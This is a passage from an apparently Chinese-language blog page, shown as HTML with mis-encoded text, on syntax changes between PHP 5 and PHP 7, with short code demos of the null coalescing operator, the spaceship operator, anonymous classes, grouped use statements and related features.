title="åå…­è¿›åˆ¶å­—ç¬¦ä¸²è§„èŒƒ"></a>åå…­è¿›åˆ¶å­—ç¬¦ä¸²è§„èŒƒ</h2><p>åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸å†è¢«è®¤ä¸ºæ˜¯æ•°å­—</p><p>ç›®å‰æˆªè‡³æœ€æ–°çš„PHP7.3ç‰ˆæœ¬ä¾ç„¶æ²¡æœ‰æ”¹å›å»çš„å¾å…†ï¼Œå®˜æ–¹ç§°ä¸ä¼šåœ¨æ”¹äº†ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;0x123&quot;</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;0x123&quot;</span> == <span class="hljs-string">&quot;291&quot;</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-string">&quot;0x123&quot;</span>));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;0xe&quot;</span> + <span class="hljs-string">&quot;0x1&quot;</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-string">&quot;foo&quot;</span>, <span class="hljs-string">&quot;0x1&quot;</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ç»“æœ:</p><p>å·¦è¾¹php5.6ï¼Œå³è¾¹php7.2</p><p><img src="/Users/j7ur8/WebBook/BookBuild/images/19-7-22_PHP_PHP7%E5%92%8CPHP5%E7%9A%84%E5%8C%BA%E5%88%AB_%E8%AF%AD%E6%B3%95%E4%BF%AE%E6%94%B9_1.png"></p><p><a href="https://www.php.net/manual/zh/function.filter-var.php">filter_var()</a> å‡½æ•°å¯ä»¥ç”¨äºæ£€æŸ¥ä¸€ä¸ª <a href="https://www.php.net/manual/zh/language.types.string.php">string</a> æ˜¯å¦å«æœ‰åå…­è¿›åˆ¶æ•°å­—,å¹¶å°†å…¶è½¬æ¢ä¸º<a href="https://www.php.net/manual/zh/language.types.integer.php">integer</a>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;0xffff&quot;</span>;<br><span class="hljs-variable">$int</span> = <span class="hljs-title function_ invoke__">filter_var</span>(<span class="hljs-variable">$str</span>, FILTER_VALIDATE_INT, FILTER_FLAG_ALLOW_HEX);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">false</span> === <span class="hljs-variable">$int</span>) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Invalid integer!&quot;</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$int</span>); <span class="hljs-comment">// int(65535)</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ç”±äºæ–°çš„ <a href="https://www.php.net/manual/zh/migration70.new-features.php#migration70.new-features.unicode-codepoint-escape-syntax">Unicode codepoint escape syntax</a>è¯­æ³•ï¼Œ ç´§è¿ç€æ— æ•ˆåºåˆ—å¹¶åŒ…å«<em>\u{</em> çš„å­—ä¸²å¯èƒ½å¼•èµ·è‡´å‘½é”™è¯¯ã€‚ ä¸ºäº†é¿å…è¿™ä¸€æŠ¥é”™ï¼Œåº”è¯¥é¿å…åæ–œæ å¼€å¤´ã€‚</p><h2 id="ç§»é™¤äº†-ASP-å’Œ-script-PHP-æ ‡ç­¾"><a href="#ç§»é™¤äº†-ASP-å’Œ-script-PHP-æ ‡ç­¾" class="headerlink" title="ç§»é™¤äº† ASP å’Œ script PHP æ ‡ç­¾"></a>ç§»é™¤äº† ASP å’Œ script PHP æ ‡ç­¾</h2><p>ä½¿ç”¨ç±»ä¼¼ ASP çš„æ ‡ç­¾ï¼Œä»¥åŠ script æ ‡ç­¾æ¥åŒºåˆ† PHP ä»£ç çš„æ–¹å¼è¢«ç§»é™¤ã€‚ å—åˆ°å½±å“çš„æ ‡ç­¾æœ‰ï¼š</p><table><thead><tr><th align="left">å¼€æ ‡ç­¾</th><th align="left">é—­æ ‡ç­¾</th></tr></thead><tbody><tr><td align="left"><code>&lt;%</code></td><td align="left"><code>%&gt;</code></td></tr><tr><td align="left"><code>&lt;%=</code></td><td align="left"><code>%&gt;</code></td></tr><tr><td align="left"><code>&lt;script language=&quot;php&quot;&gt;</code></td><td align="left"><code>&lt;/script&gt;</code></td></tr></tbody></table><h2 id="yield-å˜æ›´ä¸ºå³è”æ¥è¿ç®—ç¬¦"><a href="#yield-å˜æ›´ä¸ºå³è”æ¥è¿ç®—ç¬¦" class="headerlink" title="yield å˜æ›´ä¸ºå³è”æ¥è¿ç®—ç¬¦"></a>yield å˜æ›´ä¸ºå³è”æ¥è¿ç®—ç¬¦</h2><p>åœ¨ä½¿ç”¨ <code>yield</code> å…³é”®å­—çš„æ—¶å€™ï¼Œä¸å†éœ€è¦æ‹¬å·ï¼Œ å¹¶ä¸”å®ƒå˜æ›´ä¸ºå³è”æ¥æ“ä½œç¬¦ï¼Œå…¶è¿ç®—ç¬¦ä¼˜å…ˆçº§ä»‹äº <em>print</em> å’Œ <em>&#x3D;&gt;</em> ä¹‹é—´ã€‚ è¿™å¯èƒ½å¯¼è‡´ç°æœ‰ä»£ç çš„è¡Œä¸ºå‘ç”Ÿæ”¹å˜ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-keyword">yield</span> -<span class="hljs-number">1</span>;<br><span class="hljs-comment">// åœ¨ä¹‹å‰ç‰ˆæœ¬ä¸­ä¼šè¢«è§£é‡Šä¸ºï¼š</span><br><span class="hljs-keyword">echo</span> (<span class="hljs-keyword">yield</span>) - <span class="hljs-number">1</span>;<br><span class="hljs-comment">// ç°åœ¨ï¼Œå®ƒå°†è¢«è§£é‡Šä¸ºï¼š</span><br><span class="hljs-keyword">echo</span> <span class="hljs-keyword">yield</span> (-<span class="hljs-number">1</span>);<br><br><span class="hljs-keyword">yield</span> <span class="hljs-variable">$foo</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>;<br><span class="hljs-comment">// åœ¨ä¹‹å‰ç‰ˆæœ¬ä¸­ä¼šè¢«è§£é‡Šä¸ºï¼š</span><br><span class="hljs-keyword">yield</span> (<span class="hljs-variable">$foo</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>);<br><span class="hljs-comment">// ç°åœ¨ï¼Œå®ƒå°†è¢«è§£é‡Šä¸ºï¼š</span><br>(<span class="hljs-keyword">yield</span> <span class="hljs-variable">$foo</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥é€šè¿‡ä½¿ç”¨æ‹¬å·æ¥æ¶ˆé™¤æ­§ä¹‰ã€‚</p><h2 id="å…³äºå¯¹å¼•ç”¨æ•°ç»„å…ƒç´ åˆ›å»ºçš„å˜é‡çš„é¡ºåºå˜åŒ–"><a href="#å…³äºå¯¹å¼•ç”¨æ•°ç»„å…ƒç´ åˆ›å»ºçš„å˜é‡çš„é¡ºåºå˜åŒ–" class="headerlink" title="å…³äºå¯¹å¼•ç”¨æ•°ç»„å…ƒç´ åˆ›å»ºçš„å˜é‡çš„é¡ºåºå˜åŒ–"></a>å…³äºå¯¹å¼•ç”¨æ•°ç»„å…ƒç´ åˆ›å»ºçš„å˜é‡çš„é¡ºåºå˜åŒ–</h2><p>æœ‰å¦‚ä¸‹ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$array</span> = [];<br><span class="hljs-variable">$array</span>[<span class="hljs-string">&quot;a&quot;</span>] =&amp; <span class="hljs-variable">$array</span>[<span class="hljs-string">&quot;b&quot;</span>];<br><span class="hljs-variable">$array</span>[<span class="hljs-string">&quot;b&quot;</span>] = <span class="hljs-number">1</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$array</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ç»“æœ</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs stylus">PHP5<br><span class="hljs-function"><span class="hljs-title">array</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span></span> &#123;<br>  <span class="hljs-selector-attr">[<span class="hljs-string">&quot;b&quot;</span>]</span>=&gt;<br>  &amp;<span class="hljs-built_in">int</span>(<span class="hljs-number">1</span>)<br>  <span class="hljs-selector-attr">[<span class="hljs-string">&quot;a&quot;</span>]</span>=&gt;<br>  &amp;<span class="hljs-built_in">int</span>(<span class="hljs-number">1</span>)<br>&#125;<br><br>PHP7<br><span class="hljs-function"><span class="hljs-title">array</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span></span> &#123;<br>  <span class="hljs-selector-attr">[<span class="hljs-string">&quot;a&quot;</span>]</span>=&gt;<br>  &amp;<span class="hljs-built_in">int</span>(<span class="hljs-number">1</span>)<br>  <span class="hljs-selector-attr">[<span class="hljs-string">&quot;b&quot;</span>]</span>=&gt;<br>  &amp;<span class="hljs-built_in">int</span>(<span class="hljs-number">1</span>)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="NULLåˆå¹¶è¿ç®—ç¬¦"><a href="#NULLåˆå¹¶è¿ç®—ç¬¦" class="headerlink" title="NULLåˆå¹¶è¿ç®—ç¬¦"></a>NULLåˆå¹¶è¿ç®—ç¬¦</h2><p>ç”±äºæ—¥å¸¸ä½¿ç”¨ä¸­å­˜åœ¨å¤§é‡åŒæ—¶ä½¿ç”¨ä¸‰å…ƒè¡¨è¾¾å¼å’Œ <code>isset()</code>çš„æƒ…å†µï¼Œ æˆ‘ä»¬æ·»åŠ äº†nullåˆå¹¶è¿ç®—ç¬¦ (<em>??</em>) è¿™ä¸ªè¯­æ³•ç³–ã€‚å¦‚æœå˜é‡å­˜åœ¨ä¸”å€¼ä¸ä¸º<strong>NULL</strong>ï¼Œ å®ƒå°±ä¼šè¿”å›è‡ªèº«çš„å€¼ï¼Œå¦åˆ™è¿”å›å®ƒçš„ç¬¬äºŒä¸ªæ“ä½œæ•°ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$sss</span>=<span class="hljs-literal">NULL</span>;<br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$sss</span> ?? <span class="hljs-string">&#x27;aaa&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$username</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-variable">$sss</span>= <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$sss</span> ?? <span class="hljs-string">&#x27;aaa&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$username</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$bbb</span> ?? <span class="hljs-string">&#x27;aaa&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$username</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-comment">#ç»“æœ</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">aaa</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">aaa</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h2 id="å¤ªç©ºèˆ¹æ“ä½œç¬¦ï¼ˆç»„åˆæ¯”è¾ƒç¬¦ï¼‰"><a href="#å¤ªç©ºèˆ¹æ“ä½œç¬¦ï¼ˆç»„åˆæ¯”è¾ƒç¬¦ï¼‰" class="headerlink" title="å¤ªç©ºèˆ¹æ“ä½œç¬¦ï¼ˆç»„åˆæ¯”è¾ƒç¬¦ï¼‰"></a>å¤ªç©ºèˆ¹æ“ä½œç¬¦ï¼ˆç»„åˆæ¯”è¾ƒç¬¦ï¼‰</h2><p>å¤ªç©ºèˆ¹æ“ä½œç¬¦ç”¨äºæ¯”è¾ƒä¸¤ä¸ªè¡¨è¾¾å¼ã€‚å½“$aå°äºã€ç­‰äºæˆ–å¤§äº$bæ—¶å®ƒåˆ†åˆ«è¿”å›-1ã€0æˆ–1ã€‚ æ¯”è¾ƒçš„åŸåˆ™æ˜¯æ²¿ç”¨ PHP çš„<a href="https://www.php.net/manual/zh/types.comparisons.php"><strong>å¸¸è§„æ¯”è¾ƒè§„åˆ™</strong></a>è¿›è¡Œçš„ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// æ•´æ•°</span><br><span class="hljs-keyword">echo</span> <span class="hljs-number">1</span> &lt;=&gt; <span class="hljs-number">1</span>; <span class="hljs-comment">// 0</span><br><span class="hljs-keyword">echo</span> <span class="hljs-number">1</span> &lt;=&gt; <span class="hljs-number">2</span>; <span class="hljs-comment">// -1</span><br><span class="hljs-keyword">echo</span> <span class="hljs-number">2</span> &lt;=&gt; <span class="hljs-number">1</span>; <span class="hljs-comment">// 1</span><br><br><span class="hljs-comment">// æµ®ç‚¹æ•°</span><br><span class="hljs-keyword">echo</span> <span class="hljs-number">1.5</span> &lt;=&gt; <span class="hljs-number">1.5</span>; <span class="hljs-comment">// 0</span><br><span class="hljs-keyword">echo</span> <span class="hljs-number">1.5</span> &lt;=&gt; <span class="hljs-number">2.5</span>; <span class="hljs-comment">// -1</span><br><span class="hljs-keyword">echo</span> <span class="hljs-number">2.5</span> &lt;=&gt; <span class="hljs-number">1.5</span>; <span class="hljs-comment">// 1</span><br> <br><span class="hljs-comment">// å­—ç¬¦ä¸²</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;a&quot;</span> &lt;=&gt; <span class="hljs-string">&quot;a&quot;</span>; <span class="hljs-comment">// 0</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;a&quot;</span> &lt;=&gt; <span class="hljs-string">&quot;b&quot;</span>; <span class="hljs-comment">// -1</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;b&quot;</span> &lt;=&gt; <span class="hljs-string">&quot;a&quot;</span>; <span class="hljs-comment">// 1</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="åŒ¿åç±»"><a href="#åŒ¿åç±»" class="headerlink" title="åŒ¿åç±»"></a>åŒ¿åç±»</h2><p>ç°åœ¨æ”¯æŒé€šè¿‡<em>new class</em> æ¥å®ä¾‹åŒ–ä¸€ä¸ªåŒ¿åç±»ï¼Œè¿™å¯ä»¥ç”¨æ¥æ›¿ä»£ä¸€äº›â€œç”¨åå³ç„šâ€çš„å®Œæ•´ç±»å®šä¹‰ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Logger</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$msg</span></span>)</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Application</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$logger</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getLogger</span>(<span class="hljs-params"></span>): <span class="hljs-title">Logger</span> </span>&#123;<br>         <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;logger;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setLogger</span>(<span class="hljs-params">Logger <span class="hljs-variable">$logger</span></span>) </span>&#123;<br>         <span class="hljs-variable language_">$this</span>-&gt;logger = <span class="hljs-variable">$logger</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$app</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Application</span>;<br><span class="hljs-variable">$app</span>-&gt;<span class="hljs-title function_ invoke__">setLogger</span>(<span class="hljs-keyword">new</span> <span class="hljs-keyword">class</span> <span class="hljs-keyword">implements</span> Logger &#123;<br>    <span class="hljs-keyword">public</span> function <span class="hljs-title function_ invoke__">log</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$msg</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$msg</span>;<br>    &#125;<br>&#125;);<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$app</span>-&gt;<span class="hljs-title function_ invoke__">getLogger</span>());<br><br><span class="hljs-comment">#ç»“æœ</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">object(class<span class="hljs-doctag">@anonymous</span>)#2 (0) &#123;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h2 id="Unicode-codepoint-è½¬è¯‘è¯­æ³•"><a href="#Unicode-codepoint-è½¬è¯‘è¯­æ³•" class="headerlink" title="Unicode codepoint è½¬è¯‘è¯­æ³•"></a>Unicode codepoint è½¬è¯‘è¯­æ³•</h2><p>è¿™æ¥å—ä¸€ä¸ªä»¥16è¿›åˆ¶å½¢å¼çš„ Unicode codepointï¼Œå¹¶æ‰“å°å‡ºä¸€ä¸ªåŒå¼•å·æˆ–heredocåŒ…å›´çš„ UTF-8 ç¼–ç æ ¼å¼çš„å­—ç¬¦ä¸²ã€‚ å¯ä»¥æ¥å—ä»»ä½•æœ‰æ•ˆçš„ codepointï¼Œå¹¶ä¸”å¼€å¤´çš„ 0 æ˜¯å¯ä»¥çœç•¥çš„ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\u&#123;aa&#125;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\u&#123;0000aa&#125;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\u&#123;9999&#125;&quot;</span>;<br></code></pre></td></tr></table></figure><h2 id="å¯¼å…¥useå£°åç»„"><a href="#å¯¼å…¥useå£°åç»„" class="headerlink" title="å¯¼å…¥useå£°åç»„"></a>å¯¼å…¥useå£°åç»„</h2><p>ä»åŒä¸€ <code>namespace</code> å¯¼å…¥çš„ç±»ã€å‡½æ•°å’Œå¸¸é‡ç°åœ¨å¯ä»¥é€šè¿‡å•ä¸ª <a href="https://www.php.net/manual/zh/language.namespaces.importing.php"><em>use</em></a> è¯­å¥ ä¸€æ¬¡æ€§å¯¼å…¥äº†ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// PHP 7 ä¹‹å‰çš„ä»£ç </span><br><span class="hljs-keyword">use</span> <span class="hljs-title">some</span>\<span class="hljs-title">namespace</span>\<span class="hljs-title">ClassA</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">some</span>\<span class="hljs-title">namespace</span>\<span class="hljs-title">ClassB</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">some</span>\<span class="hljs-title">namespace</span>\<span class="hljs-title">ClassC</span> <span class="hljs-keyword">as</span> <span class="hljs-title">C</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-keyword">function</span> <span class="hljs-title">some</span>\<span class="hljs-title">namespace</span>\<span class="hljs-title">fn_a</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-keyword">function</span> <span class="hljs-title">some</span>\<span class="hljs-title">namespace</span>\<span class="hljs-title">fn_b</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-keyword">function</span> <span class="hljs-title">some</span>\<span class="hljs-title">namespace</span>\<span class="hljs-title">fn_c</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-keyword">const</span> <span class="hljs-title">some</span>\<span class="hljs-title">namespace</span>\<span class="hljs-title">ConstA</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-keyword">const</span> <span class="hljs-title">some</span>\<span class="hljs-title">namespace</span>\<span class="hljs-title">ConstB</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-keyword">const</span> <span class="hljs-title">some</span>\<span class="hljs-title">namespace</span>\<span class="hljs-title">ConstC</span>;<br><br><span class="hljs-comment">// PHP 7+ åŠæ›´é«˜ç‰ˆæœ¬çš„ä»£ç </span><br><span class="hljs-keyword">use</span> <span class="hljs-title">some</span>\<span class="hljs-title">namespace</span>\&#123;<span class="hljs-title">ClassA</span>, <span class="hljs-title">ClassB</span>, <span class="hljs-title">ClassC</span> <span class="hljs-keyword">as</span> <span class="hljs-title">C</span>&#125;;<br><span class="hljs-keyword">use</span> <span class="hljs-keyword">function</span> <span class="hljs-title">some</span>\<span class="hljs-title">namespace</span>\&#123;<span class="hljs-title">fn_a</span>, <span class="hljs-title">fn_b</span>, <span class="hljs-title">fn_c</span>&#125;;<br><span class="hljs-keyword">use</span> <span class="hljs-keyword">const</span> <span class="hljs-title">some</span>\<span class="hljs-title">namespace</span>\&#123;<span class="hljs-title">ConstA</span>, <span class="hljs-title">ConstB</span>, <span class="hljs-title">ConstC</span>&#125;;<br></code></pre></td></tr></table></figure><h2 id="æ”¾å®½äº†ä¿ç•™è¯é™åˆ¶"><a href="#æ”¾å®½äº†ä¿ç•™è¯é™åˆ¶" class="headerlink" title="æ”¾å®½äº†ä¿ç•™è¯é™åˆ¶"></a>æ”¾å®½äº†ä¿ç•™è¯é™åˆ¶</h2><p>ç°åœ¨å…è®¸å…¨å±€ä¿ç•™è¯ç”¨äºç±»&#x2F;æ¥å£&#x2F;Trait ä¸­çš„å±æ€§ã€å¸¸é‡å’Œæ–¹æ³•åã€‚ åœ¨å¼•å…¥æ–°å…³é”®è¯æ—¶ï¼Œæ­¤å˜æ›´å‡å°‘äº†å¯¹å‘åå…¼å®¹çš„ç ´åï¼Œé¿å…äº† API å‘½åçš„é™åˆ¶ã€‚</p><p>ä½¿ç”¨æµç•…çš„æ¥å£å®ç°å†…éƒ¨ DSL æ—¶ï¼Œè¿™éå¸¸æœ‰ç”¨ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// ä»¥å‰ä¸èƒ½ç”¨  &#x27;new&#x27;ã€&#x27;private&#x27; å’Œ &#x27;for&#x27;</span><br><span class="hljs-title class_">Project</span>::<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;Project Name&#x27;</span>)-&gt;<span class="hljs-keyword">private</span>()-&gt;<span class="hljs-keyword">for</span>(<span class="hljs-string">&#x27;purpose here&#x27;</span>)-&gt;<span class="hljs-title function_ invoke__">with</span>(<span class="hljs-string">&#x27;username here&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å”¯ä¸€çš„é™åˆ¶æ˜¯ï¼š <em>class</em>å…³é”®è¯ä¸èƒ½ç”¨äºå¸¸é‡åï¼Œå¦åˆ™ä¼šå’Œ ç±»åè§£æè¯­æ³•å†²çª (<em>ClassName::class</em>)ã€‚</p><h2 id="ï¼ˆå¼ƒç”¨ï¼‰PHP4-é£æ ¼çš„æ„é€ å‡½æ•°"><a href="#ï¼ˆå¼ƒç”¨ï¼‰PHP4-é£æ ¼çš„æ„é€ å‡½æ•°" class="headerlink" title="ï¼ˆå¼ƒç”¨ï¼‰PHP4 é£æ ¼çš„æ„é€ å‡½æ•°"></a>ï¼ˆå¼ƒç”¨ï¼‰PHP4 é£æ ¼çš„æ„é€ å‡½æ•°</h2><p>PHP4 é£æ ¼çš„æ„é€ å‡½æ•°ï¼ˆæ–¹æ³•åå’Œç±»åä¸€æ ·ï¼‰å°†è¢«å¼ƒç”¨ï¼Œå¹¶åœ¨å°†æ¥ç§»é™¤ã€‚ å¦‚æœåœ¨ç±»ä¸­ä»…ä½¿ç”¨äº† PHP4 é£æ ¼çš„æ„é€ å‡½æ•°ï¼ŒPHP7 ä¼šäº§ç”Ÿ <strong>E_DEPRECATED</strong> è­¦å‘Šã€‚ å¦‚æœè¿˜å®šä¹‰äº† <strong>__construct()</strong> æ–¹æ³•åˆ™ä¸å—å½±å“ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">foo</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">foo</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;I am the constructor&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="ï¼ˆå¼ƒç”¨ï¼‰é™æ€è°ƒç”¨éé™æ€çš„æ–¹æ³•"><a href="#ï¼ˆå¼ƒç”¨ï¼‰é™æ€è°ƒç”¨éé™æ€çš„æ–¹æ³•" class="headerlink" title="ï¼ˆå¼ƒç”¨ï¼‰é™æ€è°ƒç”¨éé™æ€çš„æ–¹æ³•"></a>ï¼ˆå¼ƒç”¨ï¼‰é™æ€è°ƒç”¨éé™æ€çš„æ–¹æ³•</h2><p>åºŸå¼ƒäº†<strong>é™æ€</strong>è°ƒç”¨æœªå£°æ˜æˆ <strong>static</strong> 